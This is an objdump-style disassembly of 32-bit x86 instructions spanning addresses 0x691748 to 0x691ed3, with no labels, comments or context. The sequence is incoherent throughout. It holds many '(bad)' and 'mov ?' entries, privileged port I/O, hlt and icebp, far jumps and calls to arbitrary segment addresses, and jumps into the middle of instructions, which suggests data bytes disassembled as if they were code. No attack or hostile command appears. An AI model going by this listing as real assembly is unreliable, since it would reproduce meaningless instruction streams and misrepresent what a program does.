  691748:	push   ebp
  691749:	inc    esp
  69174a:	xchg   ebx,eax
  69174b:	lea    eax,[esi+0x22]
  69174e:	or     edx,DWORD PTR [esi]
  691750:	sub    DWORD PTR [ebx+0x3d4bc7af],edx
  691756:	mov    bh,dl
  691758:	ja     0x691717
  69175a:	pop    edi
  69175b:	xchg   BYTE PTR [edx-0x50],bl
  69175e:	inc    edx
  69175f:	outs   dx,DWORD PTR ds:[esi]
  691760:	cmp    bl,bh
  691762:	inc    edi
  691763:	xor    eax,0x237a3231
  691768:	add    ecx,DWORD PTR [ecx-0x329ffa0f]
  69176e:	lock push ebp
  691770:	clc    
  691771:	cmp    ebp,ebx
  691773:	outs   dx,DWORD PTR ds:[esi]
  691774:	fstp   TBYTE PTR [eax]
  691776:	shl    dh,cl
  691778:	mov    ch,0xb9
  69177a:	sbb    al,BYTE PTR [eax-0x39]
  69177d:	test   dh,ch
  69177f:	pop    ebp
  691780:	repz pop ebx
  691782:	fwait
  691783:	je     0x6917c2
  691785:	outs   dx,BYTE PTR ds:[esi]
  691786:	sub    al,0x52
  691788:	pop    ds
  691789:	pushf  
  69178a:	out    0xb4,al
  69178c:	fmul   DWORD PTR [ecx]
  69178e:	popf   
  69178f:	or     ecx,ebx
  691791:	jno    0x691739
  691793:	popa   
  691794:	xchg   edx,eax
  691795:	icebp  
  691796:	cmp    eax,0x446bcae7
  69179b:	rol    DWORD PTR [ecx+eax*4],0xc4
  69179f:	in     al,0x37
  6917a1:	ret    0x8613
  6917a4:	lahf   
  6917a5:	pop    ss
  6917a6:	sub    ebp,DWORD PTR [eax+0x67]
  6917a9:	add    al,BYTE PTR [edx-0x27]
  6917ac:	mov    ebx,0x33c1c509
  6917b1:	mov    esi,0xa5c225ed
  6917b6:	add    BYTE PTR [edx+0x8],cl
  6917b9:	inc    edx
  6917ba:	popf   
  6917bb:	lods   eax,DWORD PTR ds:[esi]
  6917bc:	cmp    DWORD PTR [edx+eiz*1+0x6f],ecx
  6917c0:	outs   dx,BYTE PTR ds:[esi]
  6917c1:	dec    ebp
  6917c2:	aad    0xc1
  6917c4:	addr16 daa 
  6917c6:	mov    DWORD PTR [eax-0x63],edi
  6917c9:	inc    ecx
  6917ca:	test   al,0x16
  6917cc:	pop    esp
  6917cd:	shl    DWORD PTR [ecx+0x7c],cl
  6917d0:	sub    ecx,DWORD PTR [ebp+ebx*2-0x4d5614d2]
  6917d7:	les    eax,FWORD PTR [ebx-0x37]
  6917da:	xchg   esp,eax
  6917db:	sahf   
  6917dc:	loop   0x691782
  6917de:	das    
  6917df:	pop    ss
  6917e0:	mov    ebp,0x97e350d2
  6917e5:	inc    eax
  6917e6:	jns    0x691801
  6917e8:	fld    TBYTE PTR [ebx-0x2adee3bc]
  6917ee:	add    bl,ah
  6917f0:	mov    cl,0x98
  6917f2:	mov    eax,0x2545b30d
  6917f7:	out    dx,al
  6917f8:	inc    eax
  6917f9:	lahf   
  6917fa:	mov    bh,0x2c
  6917fc:	outs   dx,DWORD PTR ds:[esi]
  6917fd:	mov    bl,0x41
  6917ff:	aas    
  691800:	rol    BYTE PTR [eax-0x5],1
  691803:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  691804:	cld    
  691805:	or     ch,BYTE PTR [ebp+ebp*2-0x7cc4d966]
  69180c:	add    DWORD PTR [esi],0x6c
  69180f:	stos   BYTE PTR es:[edi],al
  691810:	fldcw  WORD PTR [esi-0xa]
  691813:	(bad)  
  691815:	call   0x2246a43c
  69181a:	jmp    0xe92f:0x31ac9c5d
  691821:	fcom   DWORD PTR ds:0x1dcb1f50
  691827:	push   ecx
  691828:	jb     0x691890
  69182a:	(bad)  
  69182b:	fcmovnu st,st(4)
  69182d:	nop
  69182e:	jmp    0x86d185d1
  691833:	jbe    0x691884
  691835:	jno    0x6917ca
  691837:	outs   dx,BYTE PTR ds:[esi]
  691838:	out    dx,eax
  691839:	sub    ch,BYTE PTR [edi]
  69183b:	mov    edi,0x8a7810a9
  691840:	sub    DWORD PTR [eax+ecx*1+0x5],ebp
  691844:	gs bswap edi
  691847:	inc    esp
  691848:	outs   dx,DWORD PTR ds:[esi]
  691849:	jne    0x69180a
  69184b:	not    BYTE PTR [esi-0x3f8b9ce6]
  691851:	lea    ebx,[eax]
  691853:	aas    
  691854:	lahf   
  691855:	xchg   ebx,eax
  691856:	mov    ebp,0xc64f58de
  69185b:	push   ebx
  69185c:	add    ch,BYTE PTR ds:0x721cf632
  691862:	or     BYTE PTR [edx-0x4e],dl
  691865:	mov    ebx,0xee2b811a
  69186a:	dec    edi
  69186c:	sub    bh,BYTE PTR [ebx]
  69186e:	inc    edx
  69186f:	out    0xa1,al
  691871:	cwde   
  691872:	mov    ?,WORD PTR [esi+0xb]
  691875:	bound  ebx,QWORD PTR [esi]
  691877:	and    esi,DWORD PTR [ecx+0x3d26afdf]
  69187d:	or     dl,BYTE PTR [ebx+edi*8-0x3c]
  691881:	sahf   
  691882:	mov    WORD PTR [ecx],gs
  691884:	inc    ebp
  691885:	sti    
  691886:	fcomip st,st(7)
  691888:	hlt    
  691889:	xor    BYTE PTR [eax+0x5a],bh
  69188c:	pop    ds
  69188d:	adc    BYTE PTR ds:[edi+0x4c],cl
  691891:	jne    0x691869
  691893:	lods   al,BYTE PTR es:[esi]
  691895:	lds    ebx,FWORD PTR [edx+edi*2]
  691898:	ja     0x6918ff
  69189a:	mov    DWORD PTR [ebx-0x39],ebx
  69189d:	out    0x88,eax
  69189f:	inc    eax
  6918a0:	or     DWORD PTR [edi-0x72],edi
  6918a3:	mov    dl,0xb6
  6918a5:	mov    esi,DWORD PTR [edx]
  6918a7:	push   ss
  6918a8:	pop    esp
  6918a9:	add    dh,BYTE PTR [edx+eax*2-0x12]
  6918ad:	popa   
  6918ae:	push   0xffffffb4
  6918b0:	inc    edi
  6918b1:	mul    BYTE PTR [ebp-0x67feec6d]
  6918b7:	cmp    edx,ecx
  6918b9:	fnstcw WORD PTR [edi-0x60]
  6918bc:	leave  
  6918bd:	dec    eax
  6918be:	push   0xdd00461f
  6918c3:	push   edi
  6918c4:	sbb    eax,0xc46eb334
  6918c9:	dec    eax
  6918ca:	sub    eax,0x4809e47a
  6918cf:	cwde   
  6918d0:	mov    esi,0xa090f8ec
  6918d5:	ds ss xchg ebp,eax
  6918d8:	adc    ah,BYTE PTR [ebp+0x416af99]
  6918de:	ret    0xa98c
  6918e1:	mov    WORD PTR [ebx+ebx*4+0x3e],ds
  6918e5:	jo     0x6918e1
  6918e7:	(bad)  
  6918e9:	adc    DWORD PTR [edx-0x64],esi
  6918ec:	ds pushf 
  6918ee:	sbb    BYTE PTR [ecx-0x7d],cl
  6918f1:	mov    edx,0x5bee818
  6918f6:	ror    DWORD PTR [eax+0x2a1580e1],0x95
  6918fd:	push   ds
  6918fe:	dec    edx
  6918ff:	and    al,0xb9
  691901:	fsubr  DWORD PTR [ecx]
  691903:	pop    ebx
  691904:	pop    ss
  691905:	les    esp,FWORD PTR [ecx-0x77]
  691908:	mov    dh,0x95
  69190a:	jno    0x6918d7
  69190c:	outs   dx,DWORD PTR ds:[esi]
  69190d:	jns    0x69192f
  69190f:	dec    edi
  691910:	test   BYTE PTR [ebp+0x6],ch
  691913:	xor    dl,ah
  691915:	lock xor al,0x92
  691918:	jl     0x69198c
  69191a:	popf   
  69191b:	xchg   esp,eax
  69191c:	ret    
  69191d:	jbe    0x691982
  69191f:	je     0x691983
  691921:	mov    ebx,0x94d20de9
  691926:	cmp    DWORD PTR [ebx-0xb],esi
  691929:	shl    dl,cl
  69192b:	ror    BYTE PTR [ebx],0x66
  69192e:	stos   DWORD PTR es:[edi],eax
  69192f:	(bad)  [eax-0x2df7104a]
  691935:	int    0xb2
  691937:	jl     0x6918ed
  691939:	aad    0x94
  69193b:	and    ebp,DWORD PTR [edi-0x758744a2]
  691941:	sub    DWORD PTR [ebx+eiz*2-0x53015093],ebp
  691948:	retf   
  691949:	xor    ebx,DWORD PTR [ecx-0x39f116ef]
  69194f:	sahf   
  691950:	test   DWORD PTR [eax+0x7ac31cfc],ebx
  691956:	push   esi
  691957:	aaa    
  691958:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  691959:	inc    BYTE PTR [ebp+0x7d]
  69195c:	pop    edx
  69195d:	test   DWORD PTR ss:[eax-0x6d19eb08],edi
  691964:	push   ebp
  691965:	mov    ebx,DWORD PTR [edi+esi*4+0x35]
  691969:	jecxz  0x691996
  69196b:	jp     0x691907
  69196d:	adc    edi,edx
  69196f:	retf   0x90bc
  691972:	ja     0x691956
  691974:	fucomip st,st(6)
  691976:	shl    BYTE PTR [esi-0x61],1
  691979:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69197a:	cmp    eax,0xfc35deb8
  69197f:	clc    
  691980:	shl    DWORD PTR ds:[esi+eax*1-0x80],0xba
  691986:	add    eax,0x4bc0f228
  69198b:	sbb    cl,BYTE PTR [ecx]
  69198d:	(bad)  
  69198e:	push   ecx
  69198f:	and    al,BYTE PTR [esi+esi*4-0x35]
  691993:	pop    esp
  691994:	sub    al,0x35
  691996:	das    
  691997:	xor    bh,0x30
  69199a:	inc    edx
  69199b:	lahf   
  69199c:	cmp    ebp,ebp
  69199e:	xchg   esi,eax
  69199f:	add    BYTE PTR [ebp-0x59cc5756],bl
  6919a5:	je     0x6919c2
  6919a7:	sub    esi,DWORD PTR [ecx+ecx*4-0x64835e8b]
  6919ae:	mov    ebx,0xf75e5746
  6919b3:	xor    esp,DWORD PTR [edx]
  6919b5:	xor    eax,0xecfea35b
  6919ba:	cmp    eax,DWORD PTR [esp+edx*2-0x38484768]
  6919c1:	mov    BYTE PTR [edi],0x4b
  6919c4:	aad    0xef
  6919c6:	dec    edi
  6919c7:	sbb    eax,DWORD PTR [eax-0x5065ee01]
  6919cd:	lds    ebx,FWORD PTR [ebx-0x10]
  6919d0:	stc    
  6919d1:	xchg   BYTE PTR [esi],bh
  6919d3:	aam    0xcc
  6919d5:	pusha  
  6919d6:	and    BYTE PTR [eax],cl
  6919d8:	cmp    DWORD PTR [ebp-0x2e],0xbeadff25
  6919df:	jg     0x691986
  6919e1:	loop   0x691a1f
  6919e3:	clc    
  6919e4:	jecxz  0x691a61
  6919e6:	nop
  6919e7:	shr    DWORD PTR [edi],0x23
  6919ea:	xchg   esp,eax
  6919eb:	adc    eax,0x96207d9e
  6919f0:	push   edx
  6919f1:	adc    dl,BYTE PTR [ebp-0x9393aca]
  6919f7:	inc    esi
  6919f8:	push   edx
  6919f9:	repnz fmul QWORD PTR ss:[ebx-0xe12c836]
  691a01:	retf   0xcfb0
  691a04:	cld    
  691a05:	inc    esp
  691a06:	loop   0x6919e7
  691a08:	mov    ch,BYTE PTR [ebp+0x46]
  691a0b:	loopne 0x691a78
  691a0d:	xchg   ebp,eax
  691a0e:	or     DWORD PTR [esi+0xc],esi
  691a11:	mov    DWORD PTR [ecx],esp
  691a13:	fsub   QWORD PTR [eax]
  691a15:	shr    BYTE PTR [esi+0x65db22cf],cl
  691a1b:	push   ds
  691a1c:	sbb    eax,0x841b97c8
  691a21:	outs   dx,BYTE PTR ds:[esi]
  691a22:	xchg   esi,eax
  691a23:	pop    ecx
  691a24:	std    
  691a25:	and    esi,DWORD PTR [esp+ebx*8+0x7c]
  691a29:	(bad)  
  691a2a:	or     DWORD PTR [ebx-0x768651ab],ecx
  691a30:	jmp    0xbdc5f423
  691a35:	nop
  691a36:	in     al,0x1
  691a38:	mov    bl,0xc7
  691a3a:	aaa    
  691a3b:	cmp    al,0x93
  691a3d:	inc    edi
  691a3e:	sbb    BYTE PTR [edi+edx*8],bl
  691a41:	enter  0xce51,0x6b
  691a45:	loopne 0x691a7d
  691a47:	sbb    al,0x4a
  691a49:	pop    ecx
  691a4a:	(bad)  
  691a4b:	cmp    al,BYTE PTR [ecx]
  691a4d:	pop    eax
  691a4e:	ror    BYTE PTR ds:0x94717270,1
  691a54:	sahf   
  691a55:	loop   0x691a27
  691a57:	xlat   BYTE PTR ds:[ebx]
  691a58:	xchg   ecx,eax
  691a59:	dec    esp
  691a5a:	sub    DWORD PTR [edx+eiz*4+0x32],eax
  691a5e:	cmp    DWORD PTR [ecx-0x32],ebp
  691a61:	into   
  691a62:	inc    esp
  691a63:	and    edx,DWORD PTR [edx-0x4]
  691a66:	enter  0x6f47,0xf0
  691a6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  691a6b:	fs jnp 0x691aab
  691a6e:	popf   
  691a6f:	lods   eax,DWORD PTR ds:[esi]
  691a70:	xor    ch,cl
  691a72:	add    BYTE PTR [edi+0x3d],bl
  691a75:	add    eax,0xf2a3b69
  691a7a:	mov    eax,ds:0x24595e74
  691a7f:	jb     0x691ac5
  691a81:	mov    edx,0x833ab96b
  691a86:	bnd jne 0x691aea
  691a89:	pop    esi
  691a8a:	add    BYTE PTR [eax+eax*2-0x6e],0xd4
  691a8f:	cwde   
  691a90:	cmp    al,bl
  691a92:	loope  0x691a94
  691a94:	cmp    BYTE PTR [eax-0x469d1a2a],bh
  691a9a:	arpl   WORD PTR [ebx+ebx*1],dx
  691a9d:	sbb    eax,0xe045bac4
  691aa2:	js     0x691a25
  691aa4:	cmp    DWORD PTR [ecx+0x31259ffd],ebx
  691aaa:	xchg   ebp,eax
  691aab:	mov    edx,0x4b5f0d0f
  691ab0:	cdq    
  691ab1:	mov    esp,0xf874ec33
  691ab6:	loope  0x691a95
  691ab8:	mov    ch,0xab
  691aba:	retf   0x93f7
  691abd:	lea    esp,gs:[ecx+0x1e]
  691ac1:	ficom  DWORD PTR [esi+0xc]
  691ac4:	mov    esi,0x5d14f030
  691ac9:	add    eax,0xacdd4ac1
  691ace:	ror    DWORD PTR [edi],1
  691ad0:	mov    ?,esp
  691ad2:	bound  edi,QWORD PTR [esp+eax*2-0x71]
  691ad6:	mov    ds:0x18914454,al
  691adb:	shr    cl,cl
  691add:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  691ade:	arpl   WORD PTR [bx+di+0x51],di
  691ae2:	mov    ch,0xc
  691ae4:	je     0x691aa0
  691ae6:	ss dec esp
  691ae8:	sbb    al,0xaf
  691aea:	mov    dl,BYTE PTR [ecx+eiz*8]
  691aed:	rcr    BYTE PTR [ebx-0x5b2f711e],0x89
  691af4:	lahf   
  691af5:	popa   
  691af6:	shl    DWORD PTR [ebp-0x55c398a4],1
  691afc:	lods   eax,DWORD PTR ds:[esi]
  691afd:	leave  
  691afe:	dec    ebx
  691aff:	mov    ebx,0x6b245db1
  691b04:	xchg   esp,eax
  691b05:	stc    
  691b06:	lds    ebp,FWORD PTR [ebx+0x18ee6308]
  691b0c:	adc    BYTE PTR [ecx-0x15],dh
  691b0f:	jo     0x691b0c
  691b11:	push   edx
  691b12:	jne    0x691b5a
  691b14:	sub    al,0xc8
  691b16:	repz push ebx
  691b18:	mov    ah,bh
  691b1a:	ins    BYTE PTR es:[edi],dx
  691b1b:	sti    
  691b1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  691b1e:	int3   
  691b1f:	push   0x865599b4
  691b24:	icebp  
  691b25:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  691b27:	pop    esi
  691b28:	cli    
  691b29:	mov    eax,ebx
  691b2b:	jbe    0x691af4
  691b2d:	cmp    al,0xf1
  691b2f:	push   ds
  691b30:	sbb    dl,cl
  691b32:	and    esp,ebx
  691b34:	dec    ecx
  691b35:	popa   
  691b36:	add    bh,dl
  691b38:	hlt    
  691b39:	dec    DWORD PTR [ebp+0x20]
  691b3c:	int    0xce
  691b3e:	out    0xc7,al
  691b40:	stos   BYTE PTR es:[edi],al
  691b41:	leave  
  691b42:	ja     0x691b52
  691b44:	push   esp
  691b45:	xchg   BYTE PTR [ebx+0x2a],dh
  691b48:	rcr    ebp,1
  691b4a:	scas   eax,DWORD PTR es:[edi]
  691b4b:	ficomp DWORD PTR [esi]
  691b4d:	cwde   
  691b4e:	push   ss
  691b4f:	out    dx,al
  691b50:	out    0x92,al
  691b52:	xchg   bh,bh
  691b54:	test   esp,esp
  691b56:	cmp    DWORD PTR [edi-0x33],ecx
  691b59:	sub    ah,ah
  691b5b:	and    eax,0x9ef560d4
  691b60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  691b61:	cmp    al,0x84
  691b63:	jp     0x691b4e
  691b65:	jl     0x691b94
  691b67:	sbb    ebx,DWORD PTR [ebp-0x61]
  691b6a:	cdq    
  691b6b:	xor    al,BYTE PTR ss:[esi]
  691b6e:	lods   al,BYTE PTR ds:[esi]
  691b6f:	loop   0x691b6a
  691b71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  691b72:	pop    ds
  691b73:	pop    eax
  691b74:	adc    BYTE PTR [esi-0x453fa885],ah
  691b7a:	and    DWORD PTR [esi-0x1451a640],edi
  691b80:	gs xchg esi,eax
  691b82:	jge    0x691b94
  691b84:	adc    eax,0x627678da
  691b89:	bound  eax,QWORD PTR [edx+ecx*8]
  691b8c:	sbb    DWORD PTR [edx+eiz*8+0x1d],esi
  691b90:	and    al,0xa4
  691b92:	lds    esp,FWORD PTR ds:0x9d2a05d9
  691b98:	(bad)  
  691b99:	pop    ebp
  691b9a:	mov    bl,0x21
  691b9c:	inc    esp
  691b9d:	dec    ecx
  691b9e:	iret   
  691b9f:	xchg   DWORD PTR [eax-0x2a],esi
  691ba2:	ss pop edx
  691ba4:	push   0xc9348f2d
  691ba9:	popf   
  691baa:	or     eax,0xad7e320e
  691baf:	mov    ?,esi
  691bb1:	mov    bl,0x29
  691bb3:	lea    ecx,[ebx-0x30]
  691bb6:	jae    0x691b49
  691bb8:	push   0x9502182c
  691bbd:	mov    BYTE PTR [edi-0x19],cl
  691bc0:	pusha  
  691bc1:	(bad)  
  691bc2:	mov    ecx,0xfde4c0b4
  691bc7:	add    DWORD PTR [ecx+edi*8+0x5e8b4654],ebp
  691bce:	cmp    al,0xe2
  691bd0:	add    DWORD PTR [esi-0x1a],ecx
  691bd3:	aad    0x7a
  691bd5:	add    eax,0xabfc3904
  691bda:	mov    bl,0xc4
  691bdc:	stos   BYTE PTR es:[edi],al
  691bdd:	mov    ebx,0xb1e94301
  691be2:	push   ecx
  691be3:	popa   
  691be4:	outs   dx,DWORD PTR ds:[esi]
  691be5:	sub    esi,DWORD PTR [ecx-0x5b3115f6]
  691beb:	mov    ebx,DWORD PTR [ecx-0x3b7ef667]
  691bf1:	bound  ebx,QWORD PTR [edi+edx*2+0x65]
  691bf5:	pop    ss
  691bf6:	int3   
  691bf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  691bf8:	(bad)  
  691bf9:	out    dx,al
  691bfa:	xor    al,0xa7
  691bfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  691bfd:	stc    
  691bfe:	fsubr  DWORD PTR [edx+0x32ac89d1]
  691c04:	inc    edi
  691c05:	and    ah,BYTE PTR [ebp-0x37843839]
  691c0b:	mov    ah,ch
  691c0d:	pop    es
  691c0e:	pusha  
  691c0f:	inc    ecx
  691c10:	lds    edx,FWORD PTR [edi]
  691c12:	add    BYTE PTR [bp+si],0x4a
  691c16:	shr    BYTE PTR [edx+0x5a],1
  691c19:	clc    
  691c1a:	loope  0x691bc3
  691c1c:	jmp    0x691bb7
  691c1e:	adc    eax,0xd730e12b
  691c23:	aad    0x39
  691c25:	aas    
  691c26:	adc    eax,0x4f3404e4
  691c2b:	xor    ah,bl
  691c2d:	into   
  691c2e:	fadd   QWORD PTR [edx]
  691c30:	mov    ebp,0x3b8ceec1
  691c35:	int3   
  691c36:	movzx  esi,WORD PTR [ebx+0x2af6b68d]
  691c3d:	popf   
  691c3e:	call   0x927d:0x5b300b5e
  691c45:	lock mov WORD PTR [edi+0x41ac87e9],gs
  691c4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  691c4d:	(bad)  
  691c4e:	scas   al,BYTE PTR es:[edi]
  691c4f:	fnstcw WORD PTR [edx-0xa043626]
  691c55:	push   esp
  691c56:	mov    dl,0x74
  691c58:	add    eax,0x5fcec806
  691c5d:	clc    
  691c5e:	cmp    eax,0xc5835828
  691c63:	xchg   BYTE PTR [edi+0x61ffb805],bh
  691c69:	not    DWORD PTR [ebp+0x65]
  691c6c:	mov    ecx,0x636c8af5
  691c71:	das    
  691c72:	call   0x31ec:0x5f1b3468
  691c79:	enter  0x38a2,0xee
  691c7d:	lock adc DWORD PTR [ebp-0x7c],esi
  691c81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  691c82:	push   edi
  691c83:	mov    edi,0xa96fb026
  691c88:	(bad)  
  691c89:	fild   DWORD PTR [eax+ebp*8-0x26]
  691c8d:	add    ch,BYTE PTR [ebp+0x1b]
  691c90:	popa   
  691c91:	fld    TBYTE PTR [edi+0x1e499578]
  691c97:	and    eax,0x2786798
  691c9c:	icebp  
  691c9d:	add    edx,eax
  691c9f:	mov    ah,0x3
  691ca1:	ffree  st(2)
  691ca3:	sub    DWORD PTR [edx],ecx
  691ca5:	bound  ebx,QWORD PTR [eax]
  691ca7:	scas   eax,DWORD PTR es:[edi]
  691ca8:	mov    esi,0x1784459d
  691cad:	lea    edx,[edi]
  691caf:	retf   
  691cb0:	popa   
  691cb1:	(bad)  
  691cb2:	into   
  691cb3:	xor    al,0x5b
  691cb5:	cmp    eax,0x7fe4fd8c
  691cba:	inc    esp
  691cbb:	bound  edi,QWORD PTR [eax+0xffdb5b8]
  691cc1:	pop    ebp
  691cc2:	out    dx,al
  691cc3:	sti    
  691cc4:	ffreep st(3)
  691cc6:	cmp    al,0xba
  691cc8:	jnp    0x691cfe
  691cca:	leave  
  691ccb:	icebp  
  691ccc:	add    BYTE PTR [ebx+ebp*1-0x58],ah
  691cd0:	lods   eax,DWORD PTR ds:[esi]
  691cd1:	and    eax,0x4d36cf5
  691cd6:	push   ecx
  691cd7:	xchg   ebp,eax
  691cd8:	data16 adc BYTE PTR [eax],bl
  691cdb:	fwait
  691cdc:	ss shl cl,0x2a
  691ce0:	mov    dh,0x87
  691ce2:	inc    esi
  691ce3:	scas   eax,DWORD PTR es:[edi]
  691ce4:	adc    eax,0x6f358cab
  691ce9:	jno    0x691d1d
  691ceb:	add    cl,dl
  691ced:	jl     0x691cd0
  691cef:	mov    ds:0xce46757e,al
  691cf4:	mov    ebp,0x940af717
  691cf9:	mov    eax,ds:0x1e674907
  691cfe:	mov    ah,0xd2
  691d00:	clc    
  691d01:	test   DWORD PTR [ebx-0x71331eac],ecx
  691d07:	dec    ebp
  691d08:	mov    eax,0xf093c721
  691d0d:	std    
  691d0e:	xchg   BYTE PTR [esp+eax*8],al
  691d11:	mov    cl,al
  691d13:	mov    dl,0x72
  691d15:	cmp    eax,0x597514f7
  691d1a:	add    bl,ch
  691d1c:	add    ah,BYTE PTR [esi+ebp*8+0x5818335d]
  691d23:	int3   
  691d24:	pop    ebx
  691d25:	push   ss
  691d26:	loop   0x691d7f
  691d28:	sbb    BYTE PTR [eax-0x50],bh
  691d2b:	sub    dh,ch
  691d2d:	ficom  WORD PTR [eax+ebp*4+0x551cc726]
  691d34:	retf   
  691d35:	jl     0x691d91
  691d37:	add    eax,0x358f0445
  691d3c:	mov    es,WORD PTR [edi+ebp*2]
  691d3f:	stc    
  691d40:	in     al,dx
  691d41:	and    ah,BYTE PTR [edx+0x144b2bbd]
  691d47:	lods   al,BYTE PTR ds:[esi]
  691d48:	jl     0x691d7d
  691d4a:	cmp    BYTE PTR [ebx],0x4f
  691d4d:	into   
  691d4e:	push   eax
  691d4f:	lods   al,BYTE PTR ds:[esi]
  691d50:	and    BYTE PTR [ecx+0xe],bh
  691d53:	cld    
  691d54:	inc    esp
  691d55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  691d56:	xor    ebp,DWORD PTR [edi-0x674b8b67]
  691d5c:	or     bl,al
  691d5e:	ja     0x691d1c
  691d60:	jecxz  0x691cf0
  691d62:	les    esi,FWORD PTR [ecx+edx*2-0x47aaf07e]
  691d69:	cmp    BYTE PTR [eax-0x1539f8c5],cl
  691d6f:	enter  0x5214,0x37
  691d73:	mov    cl,0xee
  691d75:	mov    ds:0x75ad1567,eax
  691d7a:	rol    DWORD PTR [esi+0x2486c94a],cl
  691d80:	scas   eax,DWORD PTR es:[edi]
  691d81:	dec    esp
  691d82:	arpl   WORD PTR [ecx+edx*2+0x1d7d4795],si
  691d89:	xchg   ebx,eax
  691d8a:	js     0x691d88
  691d8c:	jae    0x691df0
  691d8e:	std    
  691d8f:	or     dh,BYTE PTR ds:0x1a79815c
  691d95:	aaa    
  691d96:	pop    ebx
  691d97:	or     edx,ebx
  691d99:	mov    dh,0x33
  691d9b:	pop    DWORD PTR [edi-0x77]
  691d9e:	inc    esp
  691d9f:	or     al,0x87
  691da1:	(bad)  
  691da2:	dec    esp
  691da3:	cmp    DWORD PTR [ebp-0x1],eax
  691da6:	inc    edi
  691da7:	mov    DWORD PTR [edx-0xf718d2d],eax
  691dad:	push   ecx
  691dae:	call   0x74a3ad1f
  691db3:	push   esi
  691db4:	sub    cl,dh
  691db6:	out    dx,eax
  691db7:	loopne 0x691de8
  691db9:	lods   al,BYTE PTR ds:[esi]
  691dba:	imul   edx,ecx,0x46e92182
  691dc0:	ins    DWORD PTR es:[edi],dx
  691dc1:	arpl   WORD PTR [ebx+0x23],si
  691dc4:	pusha  
  691dc5:	mov    ah,0x3b
  691dc7:	xor    ebx,ecx
  691dc9:	int    0xbe
  691dcb:	xor    edx,DWORD PTR [ebp-0x3]
  691dce:	xchg   ecx,eax
  691dcf:	adc    eax,esp
  691dd1:	push   eax
  691dd2:	icebp  
  691dd3:	shl    BYTE PTR [edx-0x5c],cl
  691dd6:	or     edx,DWORD PTR [eax]
  691dd8:	push   esp
  691dd9:	(bad)  
  691dda:	repnz clc 
  691ddc:	ror    al,0xd4
  691ddf:	xchg   edi,eax
  691de0:	jnp    0x691d96
  691de2:	xchg   DWORD PTR [edx],ebp
  691de4:	sub    al,BYTE PTR [esi+ebp*8]
  691de7:	jne    0x691d6e
  691de9:	jnp    0x691e28
  691deb:	jmp    0x691e06
  691ded:	lods   eax,DWORD PTR ds:[esi]
  691dee:	dec    ebp
  691def:	fisttp WORD PTR [eax+ecx*1-0x560ef25b]
  691df6:	mov    WORD PTR [ebx-0x38de8de1],fs
  691dfc:	dec    ecx
  691dfd:	or     BYTE PTR [ecx],bl
  691dff:	(bad)  
  691e01:	dec    esi
  691e02:	cmp    ah,BYTE PTR [ebp-0x38d057ce]
  691e08:	pop    edx
  691e09:	retf   0x1e95
  691e0c:	popf   
  691e0d:	mov    eax,0x789566d7
  691e12:	test   eax,0xa31a228d
  691e17:	ret    
  691e18:	pop    esp
  691e19:	loopne 0x691e18
  691e1b:	mov    ds:0x9b29892,al
  691e20:	out    0x5b,eax
  691e22:	ja     0x691e5d
  691e24:	push   0xffffffc4
  691e26:	out    dx,al
  691e27:	and    DWORD PTR [edx],esi
  691e29:	inc    DWORD PTR [edx]
  691e2b:	(bad)  
  691e2d:	aad    0xe6
  691e2f:	test   al,0xc9
  691e31:	or     al,0x51
  691e33:	add    eax,0xd2cb6e97
  691e38:	lock adc eax,0xa10bbec0
  691e3e:	or     BYTE PTR [edi-0x2904b1df],ah
  691e44:	out    dx,al
  691e45:	push   esi
  691e46:	add    DWORD PTR [edx],eax
  691e48:	shl    DWORD PTR [edi+0x72],0xbf
  691e4c:	rol    esp,1
  691e4e:	sub    bl,BYTE PTR [esi-0x6e]
  691e51:	or     edi,ecx
  691e53:	sbb    eax,0x7bf52a8d
  691e58:	imul   ebp,ecx,0xcd0b1024
  691e5e:	in     al,0xf5
  691e60:	imul   edi,ebp,0x95469bd8
  691e66:	sub    ch,BYTE PTR [ecx-0x50]
  691e69:	sub    ah,BYTE PTR [eax]
  691e6b:	add    al,BYTE PTR [ecx]
  691e6d:	aad    0x0
  691e6f:	xlat   BYTE PTR ds:[ebx]
  691e70:	mov    bh,0x4f
  691e72:	mov    dl,0x94
  691e74:	test   BYTE PTR [ebx-0x6d55fdd7],dh
  691e7a:	cli    
  691e7b:	out    dx,eax
  691e7c:	repz rol BYTE PTR [ecx],1
  691e7f:	mov    dl,0x2c
  691e81:	jb     0x691e76
  691e83:	jmp    0x1044:0x5f2c5aa6
  691e8a:	loope  0x691e3e
  691e8c:	mov    gs,WORD PTR [esi]
  691e8e:	mov    esp,ecx
  691e90:	jmp    0x691e96
  691e92:	outs   dx,DWORD PTR ds:[esi]
  691e93:	push   eax
  691e94:	mov    al,ds:0x8c044038
  691e99:	imul   edx,esp,0xb4add74e
  691e9f:	mov    bh,0x7b
  691ea1:	mov    ecx,DWORD PTR [edi+0x55]
  691ea4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  691ea5:	repnz imul esp,DWORD PTR [esi-0x5fb6b0b1],0x3b
  691ead:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  691eae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  691eaf:	sbb    bl,BYTE PTR [ebx+edx*2+0x38]
  691eb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  691eb4:	push   ebx
  691eb5:	jne    0x691e38
  691eb7:	inc    esi
  691eb8:	sbb    dh,cl
  691eba:	loope  0x691f0f
  691ebc:	dec    esi
  691ebd:	fsub   st(6),st
  691ebf:	sbb    DWORD PTR [edi-0x30cd9928],ebp
  691ec5:	adc    BYTE PTR [esi+esi*1+0x70d0f0b0],ch
  691ecc:	cmp    eax,edx
  691ece:	std    
  691ecf:	bsr    ecx,DWORD PTR [esi-0x2e]
  691ed3:	or     bh,0xe1
